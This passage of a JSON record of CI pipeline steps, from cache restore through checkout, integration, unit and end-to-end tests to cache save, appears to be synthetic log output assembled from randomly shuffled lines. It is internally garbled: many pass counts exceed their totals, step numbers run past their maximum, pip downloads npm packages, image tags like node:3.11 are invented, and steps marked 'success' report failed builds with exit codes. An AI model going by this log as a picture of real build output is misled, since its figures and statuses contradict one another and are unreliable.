          "Layer 2/10: RUN command",
          "Completed.",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Fetching submodules...",
          "Snapshots: 1 passed, 18 total",
          "Finished.",
          "Creating production build...",
          "Checking out master branch",
          "Compiling utils/index.js...",
          "WARNING: jest has known vulnerabilities",
          "[12:19:49] DEBUG: Memory usage: 1798MB",
          "NODE_ENV=development",
          "Cache hit for key-1354",
          "Test Suites: 10 passed, 16 total",
          "NODE_ENV=production",
          "WARNING: lodash has known vulnerabilities",
          "Transforming 731 files...",
          "Connecting to startup.dev:443...",
          "\u2713 All checks passed",
          "  PASS: unit/test_db_connect.spec.js",
          "Using Node.js 16.14.5",
          "Generating source maps...",
          "Image pulled successfully",
          "Optimizing 69 modules...",
          "Step 10/25: Installing dependencies",
          "Checking out master branch",
          "[12:19:49] DEBUG: Initializing service",
          "Minifying main.js",
          "yarn add: Done in 17.13s",
          "[12:19:49] INFO: Processing request",
          "Success!",
          "GET /status - 204 (74ms)",
          "WARNING: express has known vulnerabilities",
          "GET /health - 201 (1ms)",
          "[12:19:49] INFO: Request completed",
          "Verifying...",
          "Compiling utils/main.py...",
          "Switched to branch 'hotfix/task-239'",
          "Step 1/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:49] INFO: Processing request",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "[12:19:49] DEBUG: Query executed in 80ms",
          "Snapshots: 3 passed, 9 total",
          "npm install: added 262 packages",
          "Layer 2/8: RUN command",
          "Tests: 350 passed, 105 total",
          "Cache hit for key-2282",
          "OK",
          "[12:19:49] INFO: Request completed",
          "Transforming 267 files...",
          "Artifact downloaded: 43MB",
          "FAILED: test_auth_login",
          "pip: Downloading axios-1.9.tar.gz",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:49] DEBUG: Memory usage: 1277MB",
          "WARNING: express has known vulnerabilities",
          "Step 20/20: Installing dependencies",
          "POST /api - 200 (396ms)",
          "POST /upload - 202 (57ms)",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "[12:19:49] DEBUG: Query executed in 15ms",
          "Generating source maps...",
          "yarn add: Done in 7.89s",
          "Artifact downloaded: 26MB",
          "Step 3/15: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 13 modules...",
          "Compiling lib/handler.rs...",
          "Processing...",
          "Creating production build...",
          "Cache restored successfully (260MB)",
          "[12:19:49] INFO: Processing request",
          "Using Python 3.10",
          "Using Python 3.11",
          "[12:19:49] DEBUG: Connection pool: 11 active",
          "Success!",
          "[12:19:49] DEBUG: Loading configuration",
          "  PASS: integration/test_auth_login.spec.js",
          "Optimizing 50 modules...",
          "Cache saved successfully",
          "Coverage: 99% statements, 93% branches",
          "Checking out main branch",
          "Pulling image: node:18",
          "[12:19:49] DEBUG: Initializing service",
          "Pushing to registry...",
          "WARNING: react has known vulnerabilities",
          "Coverage: 89% statements, 76% branches",
          "[12:19:49] INFO: Request completed",
          "[12:19:49] INFO: Cache refreshed",
          "\u2717 build failed with exit code 8",
          "Installing prettier@3.9.4",
          "Step 16/22: Deploying",
          "Connection established",
          "Optimizing 95 modules...",
          "Connection established",
          "Ready.",
          "NODE_ENV=test",
          "[12:19:49] INFO: Starting build process",
          "OK",
          "Bundling runtime.css",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-06T12:20:36.429650",
        "finished_at": "2025-12-06T12:20:42.761201",
        "log_lines": [
          "=== Step: checkout ===",
          "OK",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] ERROR: Connection failed",
          "Creating production build...",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "Connecting to test.io:443...",
          "Pulling image: alpine:latest",
          "Compiling components/utils.go...",
          "npm notice: created a lockfile",
          "  PASS: test_user_create (257ms)",
          "[12:19:49] INFO: Connecting to database",
          "Compiling components/utils.go...",
          "  PASS: test_auth_login (481ms)",
          "[12:19:49] DEBUG: Initializing service",
          "Creating production build...",
          "Uploading artifact 'dist' (39 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "Environment: staging",
          "Snapshots: 29 passed, 23 total",
          "  PASS: test_user_create (270ms)",
          "Compiling components/app.ts...",
          "Processing...",
          "Step 15/25: Linting",
          "Cache miss for key-1454",
          "Compiling lib/main.py...",
          "pip: Downloading webpack-3.1.tar.gz",
          "Waiting...",
          "Test Suites: 38 passed, 29 total",
          "Ready.",
          "pip: Downloading prettier-1.4.tar.gz",
          "Already up to date.",
          "HEAD is now at 2e52a8d",
          "Step 15/21: Installing dependencies",
          "Cache restored successfully (69MB)",
          "Compiling utils/service.java...",
          "[12:19:49] INFO: Cache refreshed",
          "Finished.",
          "[12:19:49] INFO: Request completed",
          "POST /data - 202 (79ms)",
          "Compiling lib/app.ts...",
          "WARNING: jest has known vulnerabilities",
          "HEAD is now at 4b61ea1",
          "Verifying...",
          "Optimizing 82 modules...",
          "Compiling lib/index.js...",
          "\u2713 validate completed",
          "\u2713 All checks passed",
          "[12:19:49] DEBUG: Query executed in 38ms",
          "[12:19:49] INFO: Cache refreshed",
          "[12:19:49] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Exception: ValueError",
          "Pulling image: alpine:3.11",
          "WARNING: prettier has known vulnerabilities",
          "pip: Downloading webpack-5.9.tar.gz",
          "[12:19:49] WARN: Deprecated API usage",
          "pip: Collecting express",
          "Step 13/16: Deploying",
          "Image pulled successfully",
          "Verifying...",
          "Step 9/22: Deploying",
          "[12:19:49] DEBUG: Memory usage: 527MB",
          "Step 17/18: Linting",
          "Test Suites: 41 passed, 20 total",
          "\u2717 build failed with exit code 111",
          "NODE_ENV=production",
          "\u2713 Task completed in 4262ms",
          "Snapshots: 40 passed, 32 total",
          "Fetching submodules...",
          "  PASS: test_auth_login (94ms)",
          "HEAD is now at bedec57",
          "Fetching submodules...",
          "Compiling lib/handler.rs...",
          "Snapshots: 29 passed, 30 total",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting prettier",
          "NODE_ENV=development",
          "NODE_ENV=production",
          "yarn add: Done in 7.76s",
          "Coverage: 74% statements, 75% branches",
          "Using Python 3.10",
          "Ran 75 tests in 10s",
          "Already up to date.",
          "Connecting to startup.dev:443...",
          "Finished.",
          "Cache restored successfully (54MB)",
          "Processing...",
          "pip: Downloading express-3.14.tar.gz",
          "[12:19:49] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4042ms",
          "Tests: 281 passed, 263 total",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-424'",
          "Compiling lib/utils.go...",
          "[12:19:49] INFO: Connecting to database",
          "Switched to branch 'hotfix/task-447'",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:19:49] DEBUG: Loading configuration",
          "Cache hit for key-3555",
          "Layer 6/13: COPY command",
          "OK",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_db_connect",
          "Installing express@3.15.6",
          "POST /upload - 202 (383ms)",
          "Image pulled successfully",
          "[12:19:49] INFO: Starting build process",
          "HEAD is now at 5cfb360",
          "Using Python 3.12",
          "yarn add: Done in 10.29s",
          "Ready.",
          "\u2713 Task completed in 4143ms",
          "pip: Collecting prettier",
          "Pulling image: alpine:18",
          "Done.",
          "Ran 187 tests in 59s",
          "Artifact uploaded: dist.zip (71MB)",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Memory usage: 1577MB",
          "Transforming 488 files...",
          "Cache invalidated: build",
          "Using Python 3.11",
          "Step 7/25: Testing",
          "TLS handshake completed",
          "[12:19:49] ERROR: Connection failed",
          "[12:19:49] INFO: Connecting to database",
          "Compiling utils/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "Time: 57.422s",
          "Test Suites: 50 passed, 18 total",
          "Artifact downloaded: 9MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:19:49] DEBUG: Connection pool: 4 active",
          "[12:19:49] DEBUG: Connection pool: 14 active",
          "Environment: test",
          "pip install: Successfully installed axios-1.14",
          "OK",
          "npm install: added 11 packages",
          "Cache invalidated: build",
          "Compiling utils/service.java...",
          "[12:19:49] INFO: Cache refreshed",
          "Completed.",
          "Step 18/21: Deploying",
          "Bundling styles.css",
          "Installing jest@2.15.2",
          "Using Python 3.10",
          "[12:19:49] INFO: Connecting to database",
          "npm install: added 236 packages",
          "Image pulled successfully",
          "[12:19:49] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-8656",
          "Pulling image: node:18",
          "\u2717 build failed with exit code 28",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting axios",
          "Transforming 993 files...",
          "Step 10/21: Testing",
          "pip: Downloading eslint-3.8.tar.gz",
          "pip install: Successfully installed jest-3.0",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:19:49] INFO: Request completed",
          "GET /status - 204 (84ms)",
          "Pulling image: python:18",
          "Minifying main.js",
          "pip: Downloading jest-3.11.tar.gz",
          "npm install: resolved 1673 packages",
          "Coverage: 93% statements, 82% branches",
          "Optimizing 98 modules...",
          "Waiting...",
          "Generating source maps...",
          "Coverage: 75% statements, 65% branches",
          "Cache hit for key-3222",
          "Compiling src/index.js...",
          "Artifact downloaded: 15MB",
          "Cache miss for key-2596",
          "Step 17/19: Deploying",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-06T12:20:42.761201",
        "finished_at": "2025-12-06T12:21:14.418954",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Creating production build...",
          "TLS handshake completed",
          "Building Docker image...",
          "npm notice: package.json updated",
          "OK",
          "Connection established",
          "Compiling src/service.java...",
          "[12:19:49] DEBUG: Query executed in 63ms",
          "pip install: Successfully installed axios-2.17",
          "TLS handshake completed",
          "npm install: added 10 packages",
          "[12:19:49] INFO: Cache refreshed",
          "Using Python 3.11",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Coverage: 100% statements, 96% branches",
          "Bundling styles.js",
          "pip install: Successfully installed react-3.6",
          "Connecting to acme.corp:443...",
          "Tests: 117 passed, 476 total",
          "Cache saved successfully",
          "Creating production build...",
          "npm install: added 359 packages",
          "npm install: added 29 packages",
          "Coverage: 91% statements, 79% branches",
          "Compiling lib/index.js...",
          "WARNING: react has known vulnerabilities",
          "TLS handshake completed",
          "Tests: 140 passed, 131 total",
          "[12:19:49] INFO: Cache refreshed",
          "Layer 8/11: COPY command",
          "\u2717 build failed with exit code 88",
          "Cache miss for key-8454",
          "[12:19:49] DEBUG: Initializing service",
          "Waiting...",
          "Compiling lib/index.js...",
          "Exception: TypeError",
          "Step 8/18: Linting",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:49] DEBUG: Memory usage: 189MB",
          "Verifying...",
          "[12:19:49] WARN: Deprecated API usage",
          "Ran 80 tests in 20s",
          "Finished.",
          "[12:19:49] WARN: Deprecated API usage",
          "Minifying app.js",
          "pip: Downloading express-2.11.tar.gz",
          "WARNING: express has known vulnerabilities",
          "Installing eslint@1.15.9",
          "Pushing to registry...",
          "Completed.",
          "Compiling utils/index.js...",
          "Step 3/19: Installing dependencies",
          "pip: Collecting webpack",
          "Using Python 3.12",
          "Loading...",
          "Step 2/23: Linting",
          "Image pulled successfully",
          "Cache restored successfully (267MB)",
          "Compiling lib/service.java...",
          "Minifying main.js",
          "Step 15/23: Installing dependencies",
          "\u2713 deploy completed",
          "Optimizing 21 modules...",
          "Compiling lib/index.js...",
          "Minifying vendor.js",
          "Coverage: 85% statements, 61% branches",
          "Uploading artifact 'dist' (10 files)",
          "TLS handshake completed",
          "Checking out master branch",
          "Verifying...",
          "Compiling src/handler.rs...",
          "NODE_ENV=test",
          "[12:19:49] WARN: Deprecated API usage",
          "Artifact downloaded: 48MB",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:49] DEBUG: Initializing service",
          "NODE_ENV=test",
          "Pushing to registry...",
          "Time: 34.234s",
          "yarn add: Done in 8.62s",
          "yarn add: Done in 2.28s",
          "Transforming 570 files...",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "yarn add: Done in 20.58s",
          "npm install: added 385 packages",
          "Artifact downloaded: 48MB",
          "Connection established",
          "Loading...",
          "Loading...",
          "[12:19:49] DEBUG: Connection pool: 13 active",
          "Artifact uploaded: dist.zip (67MB)",
          "[12:19:49] DEBUG: Query executed in 73ms",
          "Coverage: 96% statements, 75% branches",
          "Artifact uploaded: build.tar.gz (19MB)",
          "pip install: Successfully installed lodash-2.0",
          "HEAD is now at ec4fdc2",
          "Finished.",
          "\u2713 Step 'checkout' succeeded",
          "npm install: added 268 packages",
          "Compiling utils/handler.rs...",
          "Connecting to acme.corp:443...",
          "Completed.",
          "FAILED: test_db_connect",
          "Finished.",
          "Cache invalidated: build",
          "Already up to date.",
          "[12:19:49] WARN: Deprecated API usage",
          "Compiling components/utils.go...",
          "Compiling utils/main.py...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Waiting...",
          "Step 17/20: Running migrations",
          "[12:19:49] WARN: Deprecated API usage",
          "Ready.",
          "[12:19:49] DEBUG: Connection pool: 11 active",
          "Time: 90.32s",
          "Installing prettier@1.19.1",
          "Minifying vendor.js",
          "Step 11/24: Installing dependencies",
          "\u2717 build failed with exit code 52",
          "Compiling components/service.java...",
          "Finished.",
          "Installing jest@3.4.2",
          "Image pulled successfully",
          "Time: 7.422s",
          "Step 12/24: Running migrations",
          "Time: 47.658s",
          "Cache hit for key-5790",
          "Test Suites: 45 passed, 29 total",
          "yarn add: Done in 12.73s",
          "Tests: 379 passed, 409 total",
          "\u2713 Step 'setup' succeeded",
          "pip: Downloading eslint-2.5.tar.gz",
          "pip: Downloading jest-3.13.tar.gz",
          "Installing express@2.12.0",
          "Time: 113.881s",
          "Test Suites: 48 passed, 24 total",
          "\u2713 Step 'test' succeeded",
          "Finished.",
          "Tests: 500 passed, 51 total",
          "Environment: production",
          "Ready.",
          "yarn add: Done in 2.90s",
          "[12:19:49] INFO: Cache refreshed",
          "Connection established",
          "npm install: added 460 packages",
          "Artifact downloaded: 18MB",
          "Layer 7/11: ENV command",
          "yarn add: Done in 28.52s",
          "pip: Collecting lodash",
          "Step 14/19: Linting",
          "Compiling src/handler.rs...",
          "Switched to branch 'feature/task-598'",
          "Verifying...",
          "Generating source maps...",
          "Completed.",
          "Optimizing 54 modules...",
          "Transforming 435 files...",
          "pip install: Successfully installed lodash-1.18",
          "\u2713 deploy completed",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "pip install: Successfully installed react-4.7",
          "Step 7/15: Linting",
          "[12:19:49] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Exception: ValueError",
          "Test Suites: 33 passed, 38 total",
          "Pushing to registry...",
          "[12:19:49] DEBUG: Connection pool: 13 active",
          "npm install: added 120 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "Snapshots: 12 passed, 39 total",
          "Building Docker image...",
          "Test Suites: 18 passed, 9 total",
          "TLS handshake completed",
          "Cache saved successfully",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-06T12:21:14.418954",
        "finished_at": "2025-12-06T12:22:01.905583",
        "log_lines": [
          "=== Step: unit_tests ===",
          "FAILED: test_db_connect",
          "WARNING: react has known vulnerabilities",
          "Environment: staging",
          "Finished.",
          "NODE_ENV=test",
          "GET /api - 201 (88ms)",
          "Verifying...",
          "\u2713 Task completed in 4499ms",
          "[12:19:49] INFO: Processing request",
          "Checking out master branch",
          "Layer 8/10: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 46MB",
          "Cache miss for key-1415",
          "Loading...",
          "Layer 7/9: COPY command",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Layer 9/10: COPY command",
          "[12:19:49] DEBUG: Loading configuration",
          "Environment: development",
          "[12:19:49] DEBUG: Connection pool: 16 active",
          "[12:19:49] DEBUG: Loading configuration",
          "Finished.",
          "[12:19:49] INFO: Starting build process",
          "Ran 139 tests in 34s",
          "Compiling components/app.ts...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "npm install: added 154 packages",
          "[12:19:49] INFO: Cache refreshed",
          "Ready.",
          "Step 15/20: Linting",
          "[12:19:49] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "  PASS: test_db_connect (309ms)",
          "\u2717 build failed with exit code 63",
          "\u2717 build failed with exit code 38",
          "Creating production build...",
          "Minifying app.js",
          "Done.",
          "Verifying...",
          "Environment: test",
          "Step 5/18: Testing",
          "\u2717 build failed with exit code 99",
          "Step 9/22: Installing dependencies",
          "Already up to date.",
          "Building Docker image...",
          "Ran 142 tests in 17s",
          "HEAD is now at b016a16",
          "Using Python 3.10",
          "[12:19:49] INFO: Request completed",
          "[12:19:49] WARN: Deprecated API usage",
          "Cache restored successfully (263MB)",
          "Coverage: 79% statements, 77% branches",
          "Snapshots: 32 passed, 48 total",
          "Step 19/19: Running migrations",
          "[12:19:49] DEBUG: Loading configuration",
          "[12:19:49] INFO: Processing request",
          "Tests: 171 passed, 376 total",
          "Platform: linux-x64",
          "Snapshots: 38 passed, 42 total",
          "NODE_ENV=production",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "Coverage: 81% statements, 74% branches",
          "Step 6/21: Deploying",
          "POST /upload - 201 (174ms)",
          "[12:19:49] INFO: Processing request",
          "Artifact downloaded: 18MB",
          "Step 6/16: Installing dependencies",
          "Step 17/22: Running migrations",
          "\u2713 Task completed in 2960ms",
          "Loading...",
          "Completed.",
          "[12:19:49] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-1925",
          "[12:19:49] DEBUG: Initializing service",
          "[12:19:49] DEBUG: Initializing service",
          "Coverage: 70% statements, 93% branches",
          "Uploading artifact 'coverage' (46 files)",
          "NODE_ENV=production",
          "[12:19:49] INFO: Connecting to database",
          "Loading...",
          "Time: 102.81s",
          "Platform: linux-x64",
          "WARNING: express has known vulnerabilities",
          "POST /data - 202 (428ms)",
          "Completed.",
          "Generating source maps...",
          "Step 11/15: Testing",
          "pip: Downloading prettier-4.5.tar.gz",
          "Loading...",
          "[12:19:49] ERROR: Connection failed",
          "Layer 8/8: ENV command",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:49] DEBUG: Initializing service",
          "[12:19:49] DEBUG: Memory usage: 904MB",
          "Cache restored successfully (294MB)",
          "Optimizing 23 modules...",
          "yarn add: Done in 28.83s",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Finished.",
          "[12:19:49] DEBUG: Connection pool: 6 active",
          "Compiling lib/app.ts...",
          "Cache invalidated: dependencies",
          "Pulling image: python:latest",
          "Artifact uploaded: dist.zip (93MB)",
          "Pushing to registry...",
          "Step 12/24: Testing",
          "[12:19:49] INFO: Request completed",
          "yarn add: Done in 2.69s",
          "Connecting to example.com:443...",
          "Artifact downloaded: 21MB",
          "[12:19:49] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-233'",
          "Ready.",
          "WARNING: react has known vulnerabilities",
          "Platform: darwin-arm64",
          "[12:19:49] DEBUG: Query executed in 55ms",
          "[12:19:49] INFO: Starting build process",
          "Completed.",
          "Checking out develop branch",
          "Generating source maps...",
          "[12:19:49] DEBUG: Connection pool: 4 active",
          "NODE_ENV=development",
          "[12:19:49] INFO: Processing request",
          "Cache invalidated: dependencies",
          "[12:19:49] INFO: Request completed",
          "[12:19:49] INFO: Request completed",
          "Creating production build...",
          "Artifact downloaded: 25MB",
          "Generating source maps...",
          "Layer 10/10: RUN command",
          "Cache hit for key-2434",
          "Creating production build...",
          "Compiling components/main.py...",
          "Compiling lib/index.js...",
          "Layer 3/12: COPY command",
          "[12:19:49] DEBUG: Initializing service",
          "Waiting...",
          "Coverage: 82% statements, 70% branches",
          "Coverage: 98% statements, 97% branches",
          "\u2713 test completed",
          "OK",
          "Connection established",
          "Compiling src/index.js...",
          "Finished.",
          "Step 1/17: Running migrations",
          "[12:19:49] DEBUG: Memory usage: 1333MB",
          "Using Python 3.9",
          "\u2713 Task completed in 2018ms",
          "NODE_ENV=development",
          "Fetching submodules...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Compiling src/utils.go...",
          "Switched to branch 'feature/task-711'",
          "Connecting to example.com:443...",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (65MB)",
          "Ready.",
          "  PASS: test_api_health (182ms)",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Step 2/23: Linting",
          "[12:19:49] DEBUG: Connection pool: 17 active",
          "Generating source maps...",
          "Step 5/22: Installing dependencies",
          "Verifying...",
          "Ran 73 tests in 45s",
          "pip: Collecting eslint",
          "Ready.",
          "Already up to date.",
          "Transforming 242 files...",
          "[12:19:49] INFO: Request completed",
          "Tests: 471 passed, 83 total",
          "Compiling utils/index.js...",
          "Using Python 3.9",
          "Bundling main.js",
          "Bundling vendor.css",
          "HEAD is now at 8ead725",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-06T12:22:01.905583",
        "finished_at": "2025-12-06T12:22:17.734459",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Layer 4/15: RUN command",
          "Snapshots: 34 passed, 38 total",
          "\u2713 All checks passed",
          "Done.",
          "Pulling image: node:3.11",
          "Pulling image: node:3.11",
          "Already up to date.",
          "Cache hit for key-6224",
          "Pushing to registry...",
          "[12:19:49] INFO: Connecting to database",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "Step 14/22: Installing dependencies",
          "Already up to date.",
          "npm notice: created a lockfile",
          "HEAD is now at caeb38a",
          "Uploading artifact 'dist' (48 files)",
          "Loading...",
          "[12:19:49] ERROR: Connection failed",
          "Tests: 344 passed, 234 total",
          "[12:19:49] WARN: Deprecated API usage",
          "Ready.",
          "Using Node.js 14.8.6",
          "Compiling src/app.ts...",
          "Using Node.js 20.1.5",
          "Minifying vendor.js",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-957'",
          "[12:19:49] DEBUG: Memory usage: 512MB",
          "Verifying...",
          "[12:19:49] DEBUG: Connection pool: 6 active",
          "Coverage: 71% statements, 65% branches",
          "Finished.",
          "Using Python 3.10",
          "Finished.",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "pip install: Successfully installed axios-5.16",
          "Ran 28 tests in 46s",
          "Snapshots: 4 passed, 27 total",
          "Tests: 476 passed, 464 total",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Completed.",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Snapshots: 33 passed, 2 total",
          "OK",
          "Bundling runtime.js",
          "Ready.",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "Waiting...",
          "pip install: Successfully installed eslint-3.1",
          "Done.",
          "Snapshots: 30 passed, 13 total",
          "Step 2/18: Installing dependencies",
          "Environment: test",
          "Cache saved successfully",
          "Tests: 136 passed, 398 total",
          "Connecting to test.io:443...",
          "Compiling utils/handler.rs...",
          "Cache restored successfully (430MB)",
          "Checking out master branch",
          "[12:19:49] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "Time: 115.369s",
          "Uploading artifact 'build' (4 files)",
          "Done.",
          "Cache hit for key-4287",
          "npm install: resolved 920 packages",
          "Snapshots: 40 passed, 37 total",
          "Step 20/17: Building",
          "Uploading artifact 'dist' (3 files)",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /api - 202 (158ms)",
          "Connection established",
          "[12:19:49] INFO: Request completed",
          "[12:19:49] DEBUG: Memory usage: 1989MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "pip: Collecting axios",
          "[12:19:49] DEBUG: Memory usage: 455MB",
          "[12:19:49] DEBUG: Query executed in 86ms",
          "[12:19:49] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "npm install: added 33 packages",
          "\u2713 Step 'setup' succeeded",
          "Verifying...",
          "Compiling src/utils.go...",
          "Switched to branch 'feature/task-490'",
          "Processing...",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Initializing service",
          "npm install: added 139 packages",
          "pip install: Successfully installed express-4.15",
          "Cache saved successfully",
          "Pushing to registry...",
          "[12:19:49] DEBUG: Memory usage: 1059MB",
          "Compiling utils/handler.rs...",
          "Using Python 3.12",
          "Platform: darwin-arm64",
          "[12:19:49] DEBUG: Loading configuration",
          "Environment: production",
          "Cache hit for key-3815",
          "Step 18/23: Running migrations",
          "[12:19:49] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "Verifying...",
          "pip: Collecting lodash",
          "\u2713 Step 'checkout' succeeded",
          "NODE_ENV=production",
          "[12:19:49] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "Ran 192 tests in 8s",
          "HEAD is now at 8718830",
          "Tests: 419 passed, 216 total",
          "Cache saved successfully",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "Cache miss for key-7122",
          "Artifact downloaded: 47MB",
          "Test Suites: 7 passed, 25 total",
          "TLS handshake completed",
          "Ready.",
          "Tests: 184 passed, 414 total",
          "Creating production build...",
          "Ran 36 tests in 2s",
          "Success!",
          "GET /api - 204 (65ms)",
          "\u2713 All checks passed",
          "\u2713 Step 'checkout' succeeded",
          "Time: 100.607s",
          "Minifying main.js",
          "GET /api - 201 (67ms)",
          "[12:19:49] DEBUG: Initializing service",
          "Coverage: 87% statements, 64% branches",
          "Compiling components/handler.rs...",
          "[12:19:49] INFO: Request completed",
          "Cache hit for key-8482",
          "Tests: 453 passed, 230 total",
          "Step 17/21: Running migrations",
          "Building Docker image...",
          "\u2713 deploy completed",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 99% statements, 98% branches",
          "Cache invalidated: node_modules",
          "Step 12/23: Building",
          "yarn add: Done in 23.59s",
          "Coverage: 82% statements, 82% branches",
          "Artifact uploaded: dist.zip (28MB)",
          "Step 8/22: Linting",
          "pip: Collecting express",
          "FAILED: test_db_connect",
          "  PASS: test_auth_login (172ms)",
          "Exception: NullPointerException",
          "Step 6/17: Deploying",
          "pip: Downloading express-4.19.tar.gz",
          "WARNING: express has known vulnerabilities",
          "Time: 30.245s",
          "Using Node.js 17.20.1",
          "[12:19:49] INFO: Processing request",
          "Artifact uploaded: dist.zip (53MB)",
          "Minifying app.js",
          "[12:19:49] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:49] DEBUG: Connection pool: 11 active",
          "[12:19:49] DEBUG: Initializing service",
          "npm install: resolved 928 packages",
          "Environment: test",
          "npm install: added 84 packages",
          "[12:19:49] DEBUG: Memory usage: 889MB",
          "  PASS: unit/test_auth_login.spec.js",
          "Building Docker image...",
          "\u2713 Task completed in 4765ms",
          "Cache invalidated: build",
          "[12:19:49] INFO: Processing request",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-06T12:22:17.734459",
        "finished_at": "2025-12-06T12:22:27.231785",
        "log_lines": [
          "=== Step: save_cache ===",
          "Pushing to registry...",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (19MB)",
          "Building Docker image...",
          "  PASS: test_auth_login (244ms)",
          "Uploading artifact 'coverage' (20 files)",
          "HEAD is now at 8ba3210",
          "WARNING: react has known vulnerabilities",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (408ms)",
          "Completed.",
          "HEAD is now at 8c05796",
          "FAILED: test_auth_login",
          "Ready.",
          "Compiling components/service.java...",
          "[12:19:49] WARN: Deprecated API usage",
          "Transforming 200 files...",
          "yarn add: Done in 12.55s",
          "Fetching submodules...",
          "Fetching submodules...",
          "  PASS: test_db_connect (189ms)",
          "Coverage: 76% statements, 63% branches",
          "Processing...",
          "Cache hit for key-6907",
          "npm install: added 431 packages",
          "npm install: resolved 692 packages",
          "Building Docker image...",
          "npm install: added 312 packages",
          "pip: Downloading prettier-2.19.tar.gz",
          "NODE_ENV=development",
          "Step 1/15: Deploying",
          "Pulling image: alpine:3.11",
          "Creating production build...",
          "Layer 1/15: COPY command",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "[12:19:49] ERROR: Connection failed",
          "Loading...",
          "npm install: resolved 1146 packages",
          "Pushing to registry...",
          "Step 17/17: Testing",
          "[12:19:49] ERROR: Connection failed",
          "Using Python 3.11",
          "Time: 36.761s",
          "Pulling image: node:latest",
          "Loading...",
          "Already up to date.",
          "[12:19:49] DEBUG: Initializing service",
          "Environment: development",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:49] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "FAILED: test_cache_hit",
          "Uploading artifact 'coverage' (32 files)",
